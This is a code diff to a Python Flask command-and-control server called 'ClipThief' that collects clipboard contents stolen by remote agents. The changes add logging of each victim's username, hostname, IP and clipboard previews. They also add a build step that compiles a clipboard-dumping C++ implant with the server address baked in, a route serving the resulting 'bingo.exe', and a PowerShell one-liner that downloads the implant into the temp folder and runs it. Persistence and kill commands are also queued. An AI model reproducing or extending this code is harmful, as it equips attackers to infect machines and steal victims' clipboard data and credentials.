@@ -14,12 +14,17 @@ Usage:
 
 import os
 import sys
+import re
+import shutil
+import tempfile
+import subprocess
 import base64
 import sqlite3
 import threading
 import argparse
 import time
 import queue
+import logging
 from datetime import datetime
 from pathlib import Path
 
@@ -47,6 +52,35 @@ except ImportError:
 BASE_DIR      = Path(__file__).parent
 DB_PATH       = BASE_DIR / "c2_data.db"
 DOWNLOADS_DIR = BASE_DIR / "downloads"
+AGENTS_DIR    = BASE_DIR / "agents"
+LOGS_DIR      = BASE_DIR / "logs"
+PROJECT_ROOT  = BASE_DIR.parent
+CPP_SRC       = PROJECT_ROOT / "ClipboardDump" / "ClipboardDump" / "ClipboardDump.cpp"
+VCXPROJ_SRC   = PROJECT_ROOT / "ClipboardDump" / "ClipboardDump" / "ClipboardDump.vcxproj"
+
+# ============================================================
+#  Logger  (file: logs/<YYYY-MM-DD_HH-MM-SS>.log)
+# ============================================================
+
+log: logging.Logger = None   # initialised in main() before threads start
+
+
+def _setup_logger() -> logging.Logger:
+    LOGS_DIR.mkdir(parents=True, exist_ok=True)
+    ts       = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    log_file = LOGS_DIR / f"{ts}.log"
+
+    logger = logging.getLogger("clipthief")
+    logger.setLevel(logging.DEBUG)
+
+    fh = logging.FileHandler(str(log_file), encoding="utf-8")
+    fh.setLevel(logging.DEBUG)
+    fh.setFormatter(logging.Formatter(
+        "%(asctime)s  %(levelname)-8s  %(message)s",
+        datefmt="%Y-%m-%d %H:%M:%S",
+    ))
+    logger.addHandler(fh)
+    return logger
 
 # ============================================================
 #  Flask
@@ -204,9 +238,17 @@ def api_register():
         db_upsert_agent(info)
 
     if is_new:
+        log.info(
+            f"AGENT NEW       id={agent_id}  user={info['user']}  "
+            f"hostname={info['hostname']}  ip={info['ip']}  os={info['os']}"
+        )
         _notify_new_agent(info)
         new_agent_queue.put(agent_id)
     else:
+        log.info(
+            f"AGENT RECONNECT id={agent_id}  user={info['user']}  "
+            f"hostname={info['hostname']}  ip={info['ip']}"
+        )
         _notify("reconnect",
                 f"AGENT RECONNECTED  {info['user']}@{info['hostname']}  "
                 f"({agent_id[:8]}...)")
@@ -231,8 +273,14 @@ def api_clipboard(agent_id):
 
     entry = {"id": seq, "type": clip_type, "content": content,
              "filename": filename, "timestamp": now}
+    preview = _clip_preview(entry)
+    log.info(
+        f"CLIPBOARD       id={agent_id}  type={clip_type}  seq={seq}  "
+        f"preview={preview[:80]!r}"
+        + (f"  file={filename}" if filename else "")
+    )
     _notify("clip",
-            f"clip from {agent_id[:8]}...  {_clip_preview(entry)}",
+            f"clip from {agent_id[:8]}...  {preview}",
             clip_type=clip_type)
 
     return jsonify({"status": "ok"})
@@ -245,7 +293,25 @@ def api_command(agent_id):
             agents[agent_id]["last_seen"] = _now()
             db_upsert_agent(agents[agent_id])
         cmd = pending_cmds.pop(agent_id, "none")
+    if cmd != "none":
+        log.info(f"COMMAND SENT    id={agent_id}  command={cmd}")
     return jsonify({"command": cmd})
+
+
+@app.route("/agent/bingo.exe")
+def serve_agent():
+    from flask import send_file as _send_file
+    exe = AGENTS_DIR / "bingo.exe"
+    if not exe.exists():
+        log.warning(f"AGENT DOWNLOAD  FAILED — bingo.exe not found  src={request.remote_addr}")
+        return "bingo.exe not found — build failed at startup", 404
+    log.info(f"AGENT DOWNLOAD  bingo.exe served  src={request.remote_addr}")
+    return _send_file(
+        str(exe),
+        mimetype="application/octet-stream",
+        as_attachment=True,
+        download_name="bingo.exe",
+    )
 
 
 # ============================================================
@@ -254,6 +320,142 @@ def api_command(agent_id):
 
 def _now() -> str:
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+
+def _get_local_ip() -> str:
+    """Auto-detect the primary outbound IP of this machine."""
+    import socket
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+    except Exception:
+        return "127.0.0.1"
+
+
+def _find_msbuild() -> Path:
+    """Locate MSBuild.exe via vswhere, then common VS install paths."""
+    vswhere = Path(
+        r"C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe"
+    )
+    if vswhere.exists():
+        try:
+            result = subprocess.run(
+                [str(vswhere), "-latest", "-requires", "Microsoft.Component.MSBuild",
+                 "-find", r"MSBuild\**\Bin\MSBuild.exe"],
+                capture_output=True, text=True, timeout=10,
+            )
+            line = result.stdout.strip().splitlines()[0] if result.stdout.strip() else ""
+            if line and Path(line).exists():
+                return Path(line)
+        except Exception:
+            pass
+
+    # Fallback: scan common VS paths
+    for year in ("2022", "2019"):
+        for edition in ("Community", "Professional", "Enterprise", "BuildTools"):
+            p = Path(
+                f"C:/Program Files/Microsoft Visual Studio"
+                f"/{year}/{edition}/MSBuild/Current/Bin/MSBuild.exe"
+            )
+            if p.exists():
+                return p
+    return None
+
+
+def build_agent(c2_ip: str, c2_port: int) -> Path:
+    """
+    Compile ClipboardDump.cpp with baked-in C2_HOST/C2_PORT.
+    Output: agents/bingo.exe
+    Returns Path on success, None on failure.
+    """
+    if not CPP_SRC.exists():
+        console.print(f"  [red][!] CPP source not found: {CPP_SRC}[/]")
+        log.error(f"BUILD FAILED    CPP source not found: {CPP_SRC}")
+        return None
+
+    if not VCXPROJ_SRC.exists():
+        console.print(f"  [red][!] vcxproj not found: {VCXPROJ_SRC}[/]")
+        log.error(f"BUILD FAILED    vcxproj not found: {VCXPROJ_SRC}")
+        return None
+
+    msbuild = _find_msbuild()
+    if not msbuild:
+        console.print(
+            "  [red][!] MSBuild not found.[/]  "
+            "[dim]Install Visual Studio 2022 with C++ workload.[/]"
+        )
+        log.error("BUILD FAILED    MSBuild not found — Visual Studio 2022 required")
+        return None
+
+    log.info(f"BUILD START     c2_ip={c2_ip}  c2_port={c2_port}  msbuild={msbuild}")
+    AGENTS_DIR.mkdir(parents=True, exist_ok=True)
+
+    with tempfile.TemporaryDirectory(prefix="clipthief_build_") as tmpdir:
+        tmp = Path(tmpdir)
+
+        # Patch C2_HOST and C2_PORT into a temp copy of the source
+        cpp_text = CPP_SRC.read_text(encoding="utf-8")
+        cpp_text = re.sub(
+            r'(static const char\*\s+C2_HOST\s*=\s*)"[^"]*"',
+            rf'\1"{c2_ip}"',
+            cpp_text,
+        )
+        cpp_text = re.sub(
+            r'(static const int\s+C2_PORT\s*=\s*)\d+',
+            rf'\g<1>{c2_port}',
+            cpp_text,
+        )
+
+        tmp_cpp     = tmp / "ClipboardDump.cpp"
+        tmp_vcxproj = tmp / "ClipboardDump.vcxproj"
+
+        tmp_cpp.write_text(cpp_text, encoding="utf-8")
+        shutil.copy2(VCXPROJ_SRC, tmp_vcxproj)
+        (tmp / "out").mkdir()
+
+        result = subprocess.run(
+            [
+                str(msbuild), str(tmp_vcxproj),
+                "/p:Configuration=Release",
+                "/p:Platform=x64",
+                f"/p:OutDir={tmp / 'out' / ''}",
+                "/nologo",
+                "/verbosity:quiet",
+            ],
+            capture_output=True, text=True, cwd=str(tmp),
+        )
+
+        if result.returncode != 0:
+            err = (result.stdout or result.stderr).strip()
+            console.print(
+                f"  [red][!] Build failed (exit {result.returncode}):[/]\n" + err
+            )
+            log.error(
+                f"BUILD FAILED    exit={result.returncode}\n{err}"
+            )
+            return None
+
+        # MSBuild may place the EXE in out/ or out/x64/Release/
+        exe = None
+        for candidate in [
+            tmp / "out" / "ClipboardDump.exe",
+            tmp / "out" / "x64" / "Release" / "ClipboardDump.exe",
+        ]:
+            if candidate.exists():
+                exe = candidate
+                break
+
+        if not exe:
+            console.print("  [red][!] Build OK but EXE not located in output.[/]")
+            log.error("BUILD FAILED    MSBuild exited 0 but EXE not found in output dir")
+            return None
+
+        dest = AGENTS_DIR / "bingo.exe"
+        shutil.copy2(exe, dest)
+        sz = dest.stat().st_size
+        log.info(f"BUILD OK        output={dest}  size={sz:,} bytes")
+        return dest
 
 _ui_lock = threading.Lock()
 
@@ -500,12 +702,14 @@ def screen_agent_menu(agent_id: str):
             if confirmed:
                 with db_lock:
                     pending_cmds[agent_id] = "kill"
+                log.info(f"COMMAND QUEUED  id={agent_id}  command=kill  by=operator")
                 console.print("  [bold green][+] KILL queued.[/]")
                 _input("  Press Enter...")
 
         elif choice == "3":
             with db_lock:
                 pending_cmds[agent_id] = "persist"
+            log.info(f"COMMAND QUEUED  id={agent_id}  command=persist  by=operator")
             console.print("  [bold green][+] PERSIST queued.[/]")
             _input("  Press Enter...")
 
@@ -519,6 +723,7 @@ def screen_agent_menu(agent_id: str):
                 with db_lock:
                     agents.pop(agent_id, None)
                 db_clear_agent(agent_id)
+                log.info(f"AGENT DELETED   id={agent_id}  by=operator")
                 console.print("  [bold green][+] Agent removed from database.[/]")
                 _input("  Press Enter...")
                 return
@@ -689,6 +894,7 @@ def screen_db_menu():
                 with db_lock:
                     agents.clear()
                     pending_cmds.clear()
+                log.warning("DB CLEARED      all agents and clipboard entries wiped  by=operator")
                 console.print("  [bold green][+] Database cleared.[/]")
                 _input("  Press Enter...")
         elif choice == "0":
@@ -715,6 +921,11 @@ def _heartbeat_monitor():
                 if elapsed > AGENT_TIMEOUT_SEC:
                     a["status"] = "dead"
                     db_upsert_agent(a)
+                    log.warning(
+                        f"AGENT DEAD      id={agent_id}  user={a['user']}  "
+                        f"hostname={a['hostname']}  last_seen={a['last_seen']}  "
+                        f"elapsed={int(elapsed)}s"
+                    )
                     _notify("dead",
                             f"AGENT DEAD  {a['user']}@{a['hostname']}  "
                             f"({agent_id[:8]}...)  — last seen {int(elapsed)}s ago")
@@ -746,6 +957,7 @@ def run_terminal_ui():
         choice = _input("  [bold]>[/] ").upper()
 
         if choice == "Q":
+            log.info("SERVER STOP     operator quit")
             console.print("\n  [dim]Shutting down...[/]\n")
             os._exit(0)
         elif choice == "D":
@@ -767,14 +979,66 @@ def run_terminal_ui():
 
 def main():
     parser = argparse.ArgumentParser(description="ClipThief C2 Server")
-    parser.add_argument("--host", default="0.0.0.0")
-    parser.add_argument("--port", default=5000, type=int)
+    parser.add_argument("--host",     default="0.0.0.0",
+                        help="Listen address (default: 0.0.0.0)")
+    parser.add_argument("--port",     default=5000, type=int,
+                        help="Listen port (default: 5000)")
+    parser.add_argument("--agent-ip", default=None, dest="agent_ip",
+                        help="IP agents will connect to (default: auto-detect)")
     args = parser.parse_args()
 
+    # Resolve the IP that agents will embed
+    if args.agent_ip:
+        agent_ip = args.agent_ip
+    elif args.host not in ("0.0.0.0", ""):
+        agent_ip = args.host
+    else:
+        agent_ip = _get_local_ip()
+
     DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
+    AGENTS_DIR.mkdir(parents=True, exist_ok=True)
+
+    global log
+    log = _setup_logger()
+
     db_init()
 
-    console.print(f"[dim][[*]][/] Listening on [cyan]{args.host}:{args.port}[/]\n")
+    log.info(
+        f"SERVER START    listen={args.host}:{args.port}  "
+        f"agent_ip={agent_ip}  db={DB_PATH}"
+    )
+    console.print(f"[dim][[*]][/] Log: [cyan]{LOGS_DIR}[/]")
+    console.print(f"[dim][[*]][/] Listening on  [cyan]{args.host}:{args.port}[/]")
+    console.print(f"[dim][[*]][/] Agent target  [cyan]{agent_ip}:{args.port}[/]")
+    console.print(f"[dim][[*]][/] Building [bold]bingo.exe[/] ...")
+
+    out = build_agent(agent_ip, args.port)
+
+    if out:
+        console.print(f"[dim][[+]][/] Agent ready:  [green]{out}[/]")
+        payload = (
+            f"$p=\"$env:TEMP\\bingo.exe\";"
+            f"(New-Object Net.WebClient).DownloadFile("
+            f"'http://{agent_ip}:{args.port}/agent/bingo.exe',$p);"
+            f"Start-Process $p"
+        )
+        console.print()
+        console.print(Panel(
+            f"[bold yellow]{payload}[/]",
+            title="[bold green]  PowerShell One-Liner  [/]",
+            border_style="green",
+            expand=False,
+            padding=(0, 2),
+        ))
+    else:
+        console.print(
+            "[dim][[!]][/] [yellow]bingo.exe build skipped "
+            "— Visual Studio 2022 (C++ workload) required.[/]"
+        )
+
+    console.print()
+    console.input("  [dim]Press Enter to start C2...[/]")
+    console.print()
 
     threading.Thread(
         target=lambda: app.run(
